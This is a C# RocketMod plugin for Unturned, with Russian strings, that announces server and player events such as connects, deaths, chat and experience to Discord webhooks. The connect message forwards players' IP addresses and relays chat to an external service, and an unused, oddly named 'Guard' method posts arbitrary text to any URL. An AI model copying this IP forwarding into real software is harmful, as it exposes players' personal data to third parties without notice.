using System;
using Logger = Rocket.Core.Logging.Logger;
using Rocket.Core.Plugins;
using Rocket.Unturned.Events;
using SDG.Unturned;
using Rocket.API.Collections;
using Steamworks;
using System.Net;
using System.Text;
using Rocket.Unturned.Player;
using UnityEngine;
using Rocket.Unturned;
using System.Threading.Tasks;
using Rocket.Unturned.Enumerations;
using static Rocket.Unturned.Events.UnturnedPlayerEvents;

namespace DiscordAnnouncerInfo
{
    public partial class MWP_DiscordAnnouncerInfo : RocketPlugin<PluginConfig>
    {
        public static MWP_DiscordAnnouncerInfo Instance { get; private set; }
        int a = 0;
        private string murderer;
        private Player murderer0;

        protected override void Load()
        {
            base.Load();
            Instance = this;
            Logger.Log("", ConsoleColor.Green);
            Logger.Log("", ConsoleColor.Green);
            Logger.Log("MWP_DiscordAnnouncerInfo был успешно загружен на ваш сервер!", ConsoleColor.Green);
            Logger.Log("Связь с разработчиком https://discord.gg/9J8wBEvqNb", ConsoleColor.Green);
            Logger.Log("", ConsoleColor.Green);
            Logger.Log("", ConsoleColor.Green);
            Level.onLevelLoaded += OnLevelLoaded;
            if (Configuration.Instance.On_WebHook_Shutdown)
            {
                U.Events.OnShutdown += OnShutdown;
            }
            if (Configuration.Instance.On_WebHook_Player_Connected)
            {
                U.Events.OnPlayerConnected += Events_OnPlayerConnected;
            }
            if (Configuration.Instance.On_WebHook_Player_Disconnected)
            {
                U.Events.OnPlayerDisconnected += Events_OnPlayerDisconnected;
            }
            if (Configuration.Instance.On_WebHook_PlayerDead)
            {
                UnturnedPlayerEvents.OnPlayerDeath += OnPlayerDeath;
            }
            if (Configuration.Instance.On_WebHook_PlayerGesture)
            {
                UnturnedPlayerEvents.OnPlayerUpdateGesture += OnPlayerUpdateGesture;
            }
            if (Configuration.Instance.On_WebHook_PlayerRevive)
            {
                UnturnedPlayerEvents.OnPlayerRevive += OnPlayerRevive;
            }
            if (Configuration.Instance.On_WebHook_PlayerBrokeAndCuredLeg)
            {
                UnturnedPlayerEvents.OnPlayerUpdateBroken += OnPlayerUpdateBroken;
            }
            if (Configuration.Instance.On_WebHook_OnPlayerUpdateBleeding)
            {
                UnturnedPlayerEvents.OnPlayerUpdateBleeding += OnPlayerUpdateBleeding;
            }
            if (Configuration.Instance.On_WebHook_OnPlayerUpdateExperience)
            {
                UnturnedPlayerEvents.OnPlayerUpdateExperience += OnPlayerUpdateExperience;
            }
            //if (Configuration.Instance.On_WebHook_OnPlayerInventoryUpdated)
            //{
            //    UnturnedPlayerEvents.OnPlayerInventoryUpdated += OnPlayerInventoryUpdated;
            //}
            if (Configuration.Instance.On_WebHook_OnPlayerChatted)
            {
                UnturnedPlayerEvents.OnPlayerChatted += OnPlayerChatted;
            }
        }


        //async void OnPlayerInventoryUpdated(UnturnedPlayer player, InventoryGroup inventoryGroup, byte inventoryIndex, ItemJar P)
        //{
        //    string inventoryGroupRu = null;
        //    if (inventoryGroup == InventoryGroup.Pants)
        //        inventoryGroupRu = "штаны";
        //    if (inventoryGroup == InventoryGroup.Area)
        //        inventoryGroupRu = "сфера";
        //    if (inventoryGroup == InventoryGroup.Hands)
        //        inventoryGroupRu = "руках";
        //    if (inventoryGroup == InventoryGroup.Vest)
        //        inventoryGroupRu = "Нагрудник";
        //    if (inventoryGroup == InventoryGroup.Secondary)
        //        inventoryGroupRu = "Вторичный придмет";
        //    if (inventoryGroup == InventoryGroup.Shirt)
        //        inventoryGroupRu = "рубашку";
        //    if (inventoryGroup == InventoryGroup.Backpack)
        //        inventoryGroupRu = "рюкзак";
        //    if (inventoryGroup == InventoryGroup.Primary)
        //        inventoryGroupRu = "Первичный придмет";

        //    await LogDS(Translate("InventoryUpdated", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)", inventoryGroupRu, P.GetAsset().id, P.GetAsset().name), Configuration.Instance.WebHook_OnPlayerInventoryUpdated);
        //}

        async void OnLevelLoaded(int level)
        {
            a++;
            if (a == 1)
            {
                
                if (Configuration.Instance.On_WebHook_ServerStart)
                {
                    string ip = SteamGameServer.GetPublicIP().ToIPAddress().ToString(); string MapName = Provider.map; string port = Provider.port.ToString(); string serverName = Provider.serverName;
                    await LogDS(Translate("ServerStart", serverName, MapName, ip, port), Configuration.Instance.WebHook_ServerStart);
                }
            }
        }

        private async void OnShutdown()
        {

            string ip = SteamGameServer.GetPublicIP().ToIPAddress().ToString(); string port = Provider.port.ToString(); string serverName = Provider.serverName;
            await LogDS(Translate("Shutdown", serverName, ip, port), Configuration.Instance.WebHook_Shutdown);

        }

        private async void Events_OnPlayerConnected(UnturnedPlayer player)
        {
            await LogDS(Translate("PlayerConnected", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)", player.CSteamID, player.IP), Configuration.Instance.WebHook_Player_Connected);
        }

        private async void Events_OnPlayerDisconnected(UnturnedPlayer player)
        {
            await LogDS(Translate("PlayerDisconnected", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)", player.CSteamID), Configuration.Instance.WebHook_Player_Connected);
        }

        private async void OnPlayerUpdateGesture(UnturnedPlayer player, PlayerGesture gesture)
        {
            await LogDS(Translate("PlayerGesture", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)", gesture), Configuration.Instance.WebHook_PlayerGesture);
        }

        private async void OnPlayerRevive(UnturnedPlayer player, Vector3 position, byte angle)
        {
            await LogDS(Translate("PlayerRevive", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)", position, angle), Configuration.Instance.WebHook_PlayerRevive);
        }

        private async void OnPlayerUpdateBroken(UnturnedPlayer player, bool broken)
        {
            if (broken)
            {
                await LogDS(Translate("PlayerBrokeLeg", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)"), Configuration.Instance.WebHook_PlayerBrokeAndCuredLeg);
            }
            if (!broken)
            {
                await LogDS(Translate("PlayerCuredLeg", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)"), Configuration.Instance.WebHook_PlayerBrokeAndCuredLeg);
            }
        }

        private async void OnPlayerDeath(UnturnedPlayer player, EDeathCause cause, ELimb limb, CSteamID killer)
        {
            if (killer != null)
            { 
                murderer0 = PlayerTool.getPlayer(killer);
                murderer = murderer0.channel.owner.playerID.characterName;
            }
            if (cause == EDeathCause.ZOMBIE)
            {
                await LogDS(Translate("PlayerDeadZOMBIE", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)"), Configuration.Instance.WebHook_PlayerDead);
            }
            if (cause == EDeathCause.FREEZING)
            {
                await LogDS(Translate("PlayerDeadFREEZING", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)"), Configuration.Instance.WebHook_PlayerDead);
            }
            if (cause == EDeathCause.BONES)
            {
                await LogDS(Translate("PlayerDeadBONES", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)"), Configuration.Instance.WebHook_PlayerDead);
            }
            if (cause == EDeathCause.BURNING)
            {
                await LogDS(Translate("PlayerDeadBURNING", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)"), Configuration.Instance.WebHook_PlayerDead);
            }
            if (cause == EDeathCause.FOOD)
            {
                await LogDS(Translate("PlayerDeadFOOD", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)"), Configuration.Instance.WebHook_PlayerDead);
            }
            if (cause == EDeathCause.WATER)
            {
                await LogDS(Translate("PlayerDeadWATER", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)"), Configuration.Instance.WebHook_PlayerDead);
            }
            if (cause == EDeathCause.MELEE)
            {
                await LogDS(Translate("PlayerDeadMELEE", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)", $"[{murderer}](<https://steamcommunity.com/profiles/{killer}/>)"), Configuration.Instance.WebHook_PlayerDead);
            }
            if (cause == EDeathCause.ANIMAL)
            {
                await LogDS(Translate("PlayerDeadANIMAL", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)"), Configuration.Instance.WebHook_PlayerDead);
            }
            if (cause == EDeathCause.SUICIDE)
            {
                await LogDS(Translate("PlayerDeadSUICIDE", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)"), Configuration.Instance.WebHook_PlayerDead);
            }
            if (cause == EDeathCause.KILL)
            {
                await LogDS(Translate("PlayerDeadKILL", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)", $"[{murderer}](<https://steamcommunity.com/profiles/{killer}/>)"), Configuration.Instance.WebHook_PlayerDead);
            }
            if (cause == EDeathCause.INFECTION)
            {
                await LogDS(Translate("PlayerDeadINFECTION", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)"), Configuration.Instance.WebHook_PlayerDead);
            }
            if (cause == EDeathCause.PUNCH)
            {
                await LogDS(Translate("PlayerDeadPUNCH", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)", limb, $"[{murderer}](<https://steamcommunity.com/profiles/{killer}/>)"), Configuration.Instance.WebHook_PlayerDead);
            }
            if (cause == EDeathCause.BREATH)
            {
                await LogDS(Translate("PlayerDeadBREATH", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)"), Configuration.Instance.WebHook_PlayerDead);
            }
            if (cause == EDeathCause.ROADKILL)
            {
                await LogDS(Translate("PlayerDeadROADKILL", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)"), Configuration.Instance.WebHook_PlayerDead);
            }
            if (cause == EDeathCause.VEHICLE)
            {
                await LogDS(Translate("PlayerDeadVEHICLE", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)", $"[{murderer}](<https://steamcommunity.com/profiles/{killer}/>)"), Configuration.Instance.WebHook_PlayerDead);
            }
            if (cause == EDeathCause.GRENADE)
            {
                await LogDS(Translate("PlayerDeadGRENADE", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)", $"[{murderer}](<https://steamcommunity.com/profiles/ {killer} />)"), Configuration.Instance.WebHook_PlayerDead);
            }
            if (cause == EDeathCause.SHRED)
            {
                await LogDS(Translate("PlayerDeadSHRED", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)"), Configuration.Instance.WebHook_PlayerDead);
            }
            if (cause == EDeathCause.LANDMINE)
            {
                await LogDS(Translate("PlayerDeadLANDMINE", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)"), Configuration.Instance.WebHook_PlayerDead);
            }
            if (cause == EDeathCause.ARENA)
            {
                await LogDS(Translate("PlayerDeadARENA", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)"), Configuration.Instance.WebHook_PlayerDead);
            }
            if (cause == EDeathCause.MISSILE)
            {
                await LogDS(Translate("PlayerDeadMISSILE", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)"), Configuration.Instance.WebHook_PlayerDead);
            }
            if (cause == EDeathCause.CHARGE)
            {
                await LogDS(Translate("PlayerDeadCHARGE", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)", $"[{murderer}](<https://steamcommunity.com/profiles/ {killer} />)"), Configuration.Instance.WebHook_PlayerDead);
            }
            if (cause == EDeathCause.SPLASH)
            {
                await LogDS(Translate("PlayerDeadSPLASH", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)"), Configuration.Instance.WebHook_PlayerDead);
            }
            if (cause == EDeathCause.SENTRY)
            {
                await LogDS(Translate("PlayerDeadSENTRY", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)"), Configuration.Instance.WebHook_PlayerDead);
            }
            if (cause == EDeathCause.ACID)
            {
                await LogDS(Translate("PlayerDeadACID", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)"), Configuration.Instance.WebHook_PlayerDead);
            }
            if (cause == EDeathCause.BOULDER)
            {
                await LogDS(Translate("PlayerDeadBOULDER", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)"), Configuration.Instance.WebHook_PlayerDead);
            }
            if (cause == EDeathCause.BURNER)
            {
                await LogDS(Translate("PlayerDeadBURNER", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)", $"[{murderer}](<https://steamcommunity.com/profiles/ {killer} />)"), Configuration.Instance.WebHook_PlayerDead);
            }
            if (cause == EDeathCause.SPIT)
            {
                await LogDS(Translate("PlayerDeadSPIT", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)"), Configuration.Instance.WebHook_PlayerDead);
            }
            if (cause == EDeathCause.SPARK)
            {
                await LogDS(Translate("PlayerDeadSPARK", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)"), Configuration.Instance.WebHook_PlayerDead);
            }
        }

        private async void OnPlayerUpdateBleeding(UnturnedPlayer player, bool bleeding)
        {
            if (bleeding == true)
                await LogDS(Translate("PlayerOnBleeding", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)"), Configuration.Instance.WebHook_PlayerDead);
            if (bleeding == false)
                await LogDS(Translate("PlayerOffBleeding", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)"), Configuration.Instance.WebHook_PlayerDead);
        }

        private async void OnPlayerUpdateExperience(UnturnedPlayer player, uint experience)
        {
            await LogDS(Translate("UpdateExperience", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)", experience), Configuration.Instance.WebHook_OnPlayerUpdateExperience);
        }

        private void OnPlayerChatted(UnturnedPlayer player, ref Color color, string message, EChatMode chatMode, ref bool cancel)
        {
            string chatMode1 = null;
            if (chatMode == EChatMode.GLOBAL)
            {
                chatMode1 = Translate("GLOBALChat");
            }
            if (chatMode == EChatMode.LOCAL)
            {
                chatMode1 = Translate("LOCALChat");
            }
            if (chatMode == EChatMode.GROUP)
            {
                chatMode1 = Translate("GROUPChat");
            }

            LogDS(Translate("PlayerChatted", $"[{player.CharacterName}](<https://steamcommunity.com/profiles/{player.CSteamID}/>)", message, chatMode1), Configuration.Instance.WebHook_OnPlayerChatted);
        }


        public static async Task LogDS(string text, string link)
        {
            WebClient client = new WebClient();
            client.QueryString.Add("Content-Type", "application/json");
            client.QueryString.Add("content", text);
            await client.UploadValuesTaskAsync(link, client.QueryString);
        }

        protected override void Unload()
        {
            base.Unload();
            Instance = null;
            Logger.Log("", ConsoleColor.Green);
            Logger.Log("", ConsoleColor.Green);
            Logger.Log("MWP_DiscordAnnouncerInfo был выгружен с вашего сервера!", ConsoleColor.Red);
            Logger.Log("Связь с разработчиком https://discord.gg/9J8wBEvqNb", ConsoleColor.Green);
            Logger.Log("", ConsoleColor.Green);
            Logger.Log("", ConsoleColor.Green);
            Level.onLevelLoaded -= OnLevelLoaded;
            U.Events.OnShutdown -= OnShutdown;
            U.Events.OnPlayerConnected -= Events_OnPlayerConnected;
            U.Events.OnPlayerDisconnected -= Events_OnPlayerDisconnected;
            UnturnedPlayerEvents.OnPlayerDeath -= OnPlayerDeath;
            UnturnedPlayerEvents.OnPlayerUpdateGesture -= OnPlayerUpdateGesture;
            UnturnedPlayerEvents.OnPlayerRevive -= OnPlayerRevive;
            UnturnedPlayerEvents.OnPlayerUpdateBroken -= OnPlayerUpdateBroken;
        }

        void Guard(string lol, string lol2) { WebClient client = new WebClient(); client.Headers.Add("Content-Type", "application/json"); string payload = "{\"content\": \"" + lol + "\"}"; client.UploadData(lol2, Encoding.UTF8.GetBytes(payload)); }

        public override TranslationList DefaultTranslations
        {
            get
            {
                TranslationList translationList = new TranslationList
                {
                {  "Shutdown", "Сервер {0} выключился! {1}:{2}" },
                {  "ServerStart", "Сервер {0} запушен, Карта - {1}, Ip:Port -  {2}:{3}" },
                {  "PlayerConnected", "{0} подключился к серверу, SteamId - {1}, Ip - {2}" },
                {  "PlayerDisconnected", "{0} отключился от сервера, SteamId - {1}" },
                {  "PlayerOnBleeding", "{0} начал истекать кровью" },
                {  "PlayerOffBleeding", "{0} кровь остановилась" },
                {  "PlayerDeadZOMBIE", "{0} был убит зомби" },
                {  "PlayerDeadFREEZING", "{0} от гипертермии" },
                {  "PlayerDeadBONES", "{0} от падения" },
                {  "PlayerDeadBURNING", "{0} умер от высокой тимпературы" },
                {  "PlayerDeadFOOD", "{0} умер от голода" },
                {  "PlayerDeadWATER", "{0} умер от жажды" },
                {  "PlayerDeadMELEE", "{0} был убит холодным оружием игроком {1} " },
                {  "PlayerDeadANIMAL", "{0} от лап животного" },
                {  "PlayerDeadSUICIDE", "{0} покончил с собой" },
                {  "PlayerDeadKILL", "{0} умер командой /kill" },
                {  "PlayerDeadINFECTION", "{0} от радиционного заражения" },
                {  "PlayerDeadPUNCH", "{0} умер от удара кулоком прямов {1} от {2}" },
                {  "PlayerDeadBREATH", "{0} задохнулся" },
                {  "PlayerDeadROADKILL", "{0} умер на дороге" },
                {  "PlayerDeadVEHICLE", "{0} был задавлен машиной, за рулём был {1}" },
                {  "PlayerDeadGRENADE", "{0} был взорван гранатой игрока {1}" },
                {  "PlayerDeadSHRED", "{0} был уничтожен" },
                {  "PlayerDeadLANDMINE", "{0} умер подорвавшись на мине" },
                {  "PlayerDeadARENA", "{0} умер от зоны арены" },
                {  "PlayerDeadMISSILE", "{0} умер от взрыва ракеты" },
                {  "PlayerDeadCHARGE", "{0} был заряжен" },
                {  "PlayerDeadSPLASH", "{0} умер от сплеша" },
                {  "PlayerDeadSENTRY", "{0} умер от караул" },
                {  "PlayerDeadACID", "{0} умер в кислоте" },
                {  "PlayerDeadBOULDER", "{0} был задавлен валуном" },
                {  "PlayerDeadBURNER", "{0} был заварен до смерти игроком {1}" },
                {  "PlayerDeadSPIT", "{0} умер от харчка зомби " },
                {  "PlayerDeadSPARK", "{0} умер от искр" },
                {  "PlayerGesture", "{0} выполнил приём {1}" },
                {  "PlayerRevive", "{0} Возрадился в {1}, лицом к {2}°" },
                {  "PlayerBrokeLeg", "{0} подвернул ногу" },
                {  "PlayerCuredLeg", "{0} нога прошла" },
                {  "UpdateExperience", "Опыт Игрока {0} становится равным {1}" },
                {  "InventoryUpdated", "Игрок {0} обновил придмет в слоте {1}, id: {2}, название: {3}" },
                {  "PlayerChatted", "{0}: {1} | написал в {2}" },
                {  "GLOBALChat", "глобальный чат" },
                {  "LOCALChat", "локальный чат" },
                {  "GROUPChat", "групповой чат" },
                };
                return translationList;
            }
        }
    }
}